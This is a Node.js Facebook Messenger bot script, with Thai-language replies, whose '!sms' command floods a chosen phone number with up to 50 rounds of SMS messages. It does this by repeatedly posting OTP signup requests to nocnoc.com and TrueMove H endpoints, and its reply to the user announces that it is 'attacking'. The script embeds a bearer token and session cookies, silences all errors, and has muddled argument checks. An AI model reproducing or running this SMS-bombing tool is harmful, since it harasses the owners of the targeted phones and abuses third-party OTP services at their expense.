var request = require('request');
var http = require("http");
var axios = require("axios");
const fs = require("fs");
const login = require("fb-chat-api");



login({ appState: JSON.parse(fs.readFileSync('cookie9.json','utf8')) }, (err, api) => {
  if (err) return console.error(err);
  api.setOptions({listenEvents: true})
  api.listen((err, message) => {
    if (err) return console.error(err);

//sms
if (message.body.startsWith("!sms")) {
var sms = message.body.split(" ");
if (sms[1] === undefined) {
   api.sendMessage("!sms <namber> <num> \n > namber/เบอร์ \n > num/จํานวน",message.threadID)
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log (" - sms")
}
if (sms[1] === undefined || sms[2] === undefined || sms[3] === undefined) {
if (sms[1] > 9999999999) {
    api.sendMessage("กรุณาใส่เบอร์ 10หลัก \n > ตัวอย่าง 080-289-0xxx",message.threadID)
}
if (sms[2] > 51) {
   api.setMessageReaction("\uD83D\uDE20", message.messageID);
   api.sendMessage("กรุณาใส่จํานวนตํ่ากว่า 50",message.threadID)
}
if (sms[1] < 9999999999) {
if (sms[2] < 51) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log (sms[1],sms[2])
   api.sendMessage("กําลังโจมตี BOT SAYSER \n> เบอร์ : "+sms[1]+"\n> จํานวน : "+sms[2],message.threadID)
   for (var i = 0; i<sms[2]; i++) {
       axios.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.663", json={
  "lang": "th",
  "userType": "BUYER",
  "locale": "th",
  "orgIdfier": "scg",
  "phone": sms[1],
  "type": "signup",
  "otpTemplate": "buyer_signup_otp_message",
  "userParams": {
   "buyerName": "ibteesam"
  }
}, headers={"authorization":"Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..EjlRCeeVlwEMnAap7RD7_w.gmsXchvWAkPnGbtnfH4VS2m_awxyMcelD4wsmOuxNF1_BqS72z370qCxeNNsR-P2wsK_6qUNJ0ek4iSUPuTwV31WvXurXdzCBBF4iXIIOkNlHj-vka8Sy8zjin_E0CRurTFv8tsF6mpeYTA9lO3cxQ.hVTKUbtouY4LMpxVRXVpMw", "content-type": "application/json"})
        axios.post("https://topping.truemoveh.com/api/get_request_otp", data="mobile_number="+sms[1],headers={
        "Accept": "application/json, text/plain, /",
        "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
        "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})   
       console.log ("sms - ",sms[1],sms[2],i)}
   }
  }
 }
}

});
});


process.on('uncaughtException', function
(err) {
});
process.on('unhandledRejection', function
(err) {
});
